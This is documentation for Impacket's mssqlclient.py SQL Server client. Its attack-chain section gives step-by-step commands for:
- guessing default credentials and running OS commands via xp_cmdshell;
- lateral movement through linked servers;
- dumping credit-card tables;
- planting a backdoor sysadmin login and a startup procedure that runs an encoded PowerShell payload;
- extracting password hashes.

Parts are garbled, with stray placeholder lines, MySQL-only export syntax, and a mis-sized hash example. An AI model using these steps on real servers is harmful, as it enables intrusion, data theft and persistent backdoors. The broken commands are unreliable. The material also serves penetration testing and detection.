# mssqlclient.py

## Overview
`mssqlclient.py` is a Microsoft SQL Server client tool in the Impacket suite. This tool is categorized under Database Access and provides functionality for connecting to and interacting with MSSQL servers remotely. It implements the TDS (Tabular Data Stream) protocol to establish connections and execute SQL queries, making it a powerful tool for database administration and penetration testing.

## Detailed Description
`mssqlclient.py` is a comprehensive MSSQL client that implements both [MS-TDS] (Tabular Data Stream Protocol) and [MC-SQLR] (SQL Server Resolution Protocol) specifications. The tool provides an interactive SQL shell interface that allows users to execute SQL commands, stored procedures, and administrative functions on remote MSSQL servers.

This tool is particularly valuable for penetration testing scenarios where attackers have obtained database credentials or need to exploit MSSQL-specific features like xp_cmdshell for command execution. It supports multiple authentication methods including Windows authentication, SQL server authentication, and Kerberos, making it versatile for different network environments.

### Key Features:
- **Interactive SQL Shell**: Full-featured command-line interface for SQL operations
- **Command Execution**: Built-in support for xp_cmdshell and system command execution
- **File Operations**: Upload and download files to/from the database server
- **Impersonation Support**: Execute commands as different users (EXEC AS functionality)
- **Database Enumeration**: Built-in commands for enumerating users, databases, and permissions
- **Multiple Authentication**: Support for password, hash, and Kerberos authentication methods
- **SSL/TLS Support**: Secure connections to database servers
- **Linked Server Support**: Access and execute commands through SQL Server links

### Technical Details:
- Uses TDS (Tabular Data Stream) protocol for MSSQL communication
- Implements SQL Server Resolution Protocol for instance discovery
- Supports both SQL Server and Windows authentication modes
- Compatible with SQL Server 2000, 2005, 2008, 2012, 2014, 2016, 2017, 2019, and 2022
- Handles encrypted and unencrypted connections

## Command Line Options

```
mssqlclient.py [-h] [-db DB] [-windows-auth] [-debug] [-ts] [-show]
```

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

usage: mssqlclient.py [-h] [-db DB] [-windows-auth] [-debug] [-ts] [-show]
                      [-command [COMMAND ...]] [-file FILE]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      [-target-ip ip address] [-port PORT]
                      target

TDS client implementation (SSL supported).

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -db DB                MSSQL database instance (default None)
  -windows-auth         whether or not to use Windows Authentication (default
                        False)
  -debug                Turn DEBUG output ON
  -ts                   Adds timestamp to every logging output
  -show                 show the queries
  -command [COMMAND ...]
                        Commands to execute in the SQL shell. Multiple
                        commands can be passed.
  -file FILE            input file with commands to execute in the SQL shell

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from
                        ccache file (KRB5CCNAME) based on target parameters.
                        If valid credentials cannot be found, it will use the
                        ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256
                        bits)

connection:
  -dc-ip ip address     IP Address of the domain controller. If ommited it use
                        the domain part (FQDN) specified in the target
                        parameter
  -target-ip ip address
                        IP Address of the target machine. If omitted it will
                        use whatever was specified as target. This is useful
                        when target is the NetBIOS name and you cannot resolve
                        it
  -port PORT            target MSSQL port (default 1433)


## Usage Examples

### Basic Database Connection
```bash
# Connect with SQL Server authentication
python3 mssqlclient.py sa:password@192.168.1.100

# Connect with Windows authentication
python3 mssqlclient.py -windows-auth domain.com/user:password@sql.domain.com

# Connect to specific database instance
python3 mssqlclient.py -db master sa:password@192.168.1.100

# Connect to non-standard port
python3 mssqlclient.py -port 1434 sa:password@192.168.1.100
```

### Authentication Methods
```bash
# Using NTLM hash authentication
python3 mssqlclient.py -hashes :5e884898da28047151d0e56f8dc6292773603d0d domain.com/user@sql.domain.com

# Using Kerberos authentication
python3 mssqlclient.py -k domain.com/user:password@sql.domain.com

# Using AES key for Kerberos
python3 mssqlclient.py -aesKey 32characterhexkey -k domain.com/user@sql.domain.com

# No password prompt (useful with Kerberos)
python3 mssqlclient.py -no-pass -k domain.com/user@sql.domain.com
```

### Command Execution
```bash
# Execute single SQL command
python3 mssqlclient.py sa:password@192.168.1.100 -command "SELECT @@version"

# Execute multiple commands
python3 mssqlclient.py sa:password@192.168.1.100 -command "USE master" "SELECT name FROM sys.databases"

# Execute commands from file
python3 mssqlclient.py sa:password@192.168.1.100 -file queries.sql

# Show queries being executed
python3 mssqlclient.py -show sa:password@192.168.1.100
```
python3 mssqlclient.py [advanced_parameters]

# Advanced example 2
python3 mssqlclient.py [advanced_parameters_2]

# Debug mode
python3 mssqlclient.py DOMAIN/user:password@target -debug
```

## Interactive SQL Shell Commands

Once connected, the tool provides an interactive SQL shell with the following special commands:

### Database Enumeration
```sql
-- List all databases
enum_db

-- List all users
enum_users

-- List database owners
enum_owner

-- List logins
enum_logins

-- Check impersonation privileges
enum_impersonate

-- List linked servers
enum_links
```

### Command Execution
```sql
-- Enable xp_cmdshell (requires sysadmin privileges)
enable_xp_cmdshell

-- Execute system commands
xp_cmdshell whoami
xp_cmdshell "dir C:\"

-- Disable xp_cmdshell
disable_xp_cmdshell

-- Execute shell commands (if xp_cmdshell is enabled)
shell whoami
shell "net user"
```

### File Operations
```sql
-- Download file from server
download C:\temp\file.txt

-- Upload file to server  
upload /local/path/file.txt C:\temp\file.txt

-- Directory listing using xp_dirtree
xp_dirtree C:\temp
```

### User Impersonation
```sql
-- Impersonate login
exec_as_login sa

-- Impersonate user
exec_as_user dbo

-- Use linked server
use_link LINKEDSERVER
```

### Local Commands
```sql
-- Change local directory
lcd /tmp

-- Show/hide queries
show_query
mask_query

-- Exit the shell
exit
```

## Attack Chain Integration

### Initial Database Access
```bash
# Step 1: Discover MSSQL services
nmap -p 1433 --script ms-sql-info 192.168.1.0/24

# Step 2: Attempt connection with common credentials
python3 mssqlclient.py sa:sa@192.168.1.100
python3 mssqlclient.py sa:password@192.168.1.100
python3 mssqlclient.py sa:@192.168.1.100  # Empty password

# Step 3: Try Windows authentication if domain joined
python3 mssqlclient.py -windows-auth domain.com/user:password@sql.domain.com
```

### Privilege Escalation Through MSSQL
```bash
# Step 1: Connect and enumerate privileges
python3 mssqlclient.py sa:password@192.168.1.100
SQL> enum_impersonate

# Step 2: Impersonate higher privileged user
SQL> exec_as_login sysadmin_user
SQL> SELECT SYSTEM_USER, USER_NAME()

# Step 3: Enable command execution
SQL> enable_xp_cmdshell

# Step 4: Execute system commands
SQL> xp_cmdshell "whoami /all"
SQL> xp_cmdshell "net localgroup administrators"
```

### Lateral Movement via Linked Servers
```bash
# Step 1: Enumerate linked servers
python3 mssqlclient.py sa:password@sql1.domain.com
SQL> enum_links

# Step 2: Use linked server for lateral movement
SQL> use_link SQL2
SQL> SELECT @@servername  # Confirm connection to linked server

# Step 3: Execute commands on linked server
SQL> xp_cmdshell "whoami"  # This executes on the linked server

# Step 4: Chain through multiple linked servers
SQL> use_link SQL3
SQL> enum_db  # Enumerate databases on third server
```

### Data Exfiltration
```bash
# Step 1: Connect and identify sensitive databases
python3 mssqlclient.py sa:password@192.168.1.100
SQL> enum_db

# Step 2: Query sensitive data
SQL> USE CustomerDB  
SQL> SELECT TOP 10 * FROM CreditCards

# Step 3: Export data to files
SQL> SELECT * FROM Users INTO OUTFILE 'C:\temp\users.csv'

# Step 4: Download files locally
SQL> download C:\temp\users.csv
```

### Persistence Through MSSQL
```bash
# Step 1: Create backdoor user
python3 mssqlclient.py sa:password@192.168.1.100
SQL> CREATE LOGIN backdoor WITH PASSWORD = 'ComplexPass123!'
SQL> ALTER SERVER ROLE sysadmin ADD MEMBER backdoor

# Step 2: Create startup stored procedure for persistence
SQL> USE master
SQL> CREATE PROCEDURE sp_backdoor AS xp_cmdshell 'powershell.exe -enc <base64_payload>'
SQL> EXEC sp_procoption 'sp_backdoor', 'startup', 'true'

# Step 3: Test backdoor access
python3 mssqlclient.py backdoor:ComplexPass123!@192.168.1.100
```

### Hash Extraction from MSSQL
```bash
# Step 1: Connect with sysadmin privileges
python3 mssqlclient.py sa:password@192.168.1.100

# Step 2: Extract SQL Server login hashes
SQL> SELECT name, password_hash FROM sys.sql_logins

# Step 3: Extract Windows authentication tokens (if available)
SQL> SELECT * FROM sys.dm_exec_sessions WHERE is_user_process = 1

# Step 4: Use extracted information for further attacks
python3 mssqlclient.py -hashes :extracted_ntlm_hash domain.com/user@target
```

## Prerequisites
- Python 3.x with Impacket installed
- Valid MSSQL credentials (SQL Server or Windows authentication)
- Network access to MSSQL server (default port 1433)
- Understanding of SQL Server administration and security model
- Knowledge of T-SQL syntax for advanced operations

## Security Features and Bypasses

### xp_cmdshell Security
- **Default State**: Disabled on modern SQL Server versions
- **Requirements**: Requires sysadmin privileges to enable
- **Detection**: Command execution generates Windows event logs
- **Bypass**: Use alternative stored procedures like xp_regwrite, sp_OACreate

### Authentication Security
- **Windows Authentication**: More secure, uses domain credentials
- **SQL Server Authentication**: Uses database-specific logins
- **Mixed Mode**: Supports both authentication types
- **Encryption**: Modern versions support SSL/TLS encryption

### Common Misconfigurations
- **Default Credentials**: sa account with weak or empty passwords
- **Excessive Privileges**: Users with unnecessary sysadmin rights
- **Linked Servers**: Improperly configured server links
- **Guest Access**: Enabled guest database access

## Detection Considerations

### Network Indicators
- **TDS Traffic**: Unusual TDS protocol connections on port 1433
- **Authentication Attempts**: Multiple failed login attempts
- **Encrypted Connections**: SSL/TLS handshakes to database ports
- **Non-Standard Ports**: Connections to alternative MSSQL ports

### Database Logs
- **Login Events**: Successful and failed authentication attempts
- **Command Execution**: xp_cmdshell and stored procedure executions
- **Permission Changes**: Modifications to server and database roles
- **Database Access**: Unusual query patterns or data access

### System Indicators
- **Process Execution**: Sqlservr.exe spawning child processes
- **File System**: Unusual file creation or modification via database
- **Registry Changes**: Modifications to SQL Server configuration
- **Network Connections**: Outbound connections from database server

## Common Issues and Troubleshooting

### Connection Issues
```bash
# Error: Connection timeout
# Solution: Check firewall settings and SQL Server service status
python3 mssqlclient.py -debug sa:password@192.168.1.100

# Error: Login failed for user
# Solution: Verify credentials and authentication mode
python3 mssqlclient.py -windows-auth domain.com/user:password@sql.domain.com
```

### Authentication Problems
```bash
# Error: Kerberos authentication failed
# Solution: Check domain configuration and credentials
python3 mssqlclient.py -dc-ip 192.168.1.10 -k domain.com/user:password@sql.domain.com

# Error: Hash authentication not working
# Solution: Ensure NTLM authentication is enabled on SQL Server
python3 mssqlclient.py -hashes :ntlmhash domain.com/user@sql.domain.com
```

### Command Execution Issues
```bash
# Error: xp_cmdshell not available
# Solution: Enable xp_cmdshell first
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami

# Error: Access denied
# Solution: Check if user has appropriate privileges
SQL> SELECT IS_SRVROLEMEMBER('sysadmin')
```

## Related Tools
- [secretsdump.py](secretsdump.md) - Extract secrets from database servers
- [atexec.py](atexec.md) - Execute commands via scheduled tasks
- [dcomexec.py](dcomexec.md) - Execute commands via DCOM
- [wmiexec.py](wmiexec.md) - Execute commands via WMI
- Native SQL Server tools (sqlcmd, SQL Server Management Studio)
- Database vulnerability scanners (Nessus, OpenVAS)

---

*This documentation is based on the actual source code and functionality of mssqlclient.py from Impacket.*
